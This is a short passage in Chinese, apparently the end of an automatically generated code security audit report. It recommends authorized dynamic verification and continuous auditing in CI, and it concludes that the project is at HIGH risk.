- **P1 补充动态验证覆盖：** 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。
- **P2 纳入持续审计流程：** 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。


## 7. 结论

综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 HIGH 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。

---

*本报告由 AuditAgentX 自动生成，PoC 仅在本地授权沙箱或授权目标环境验证。*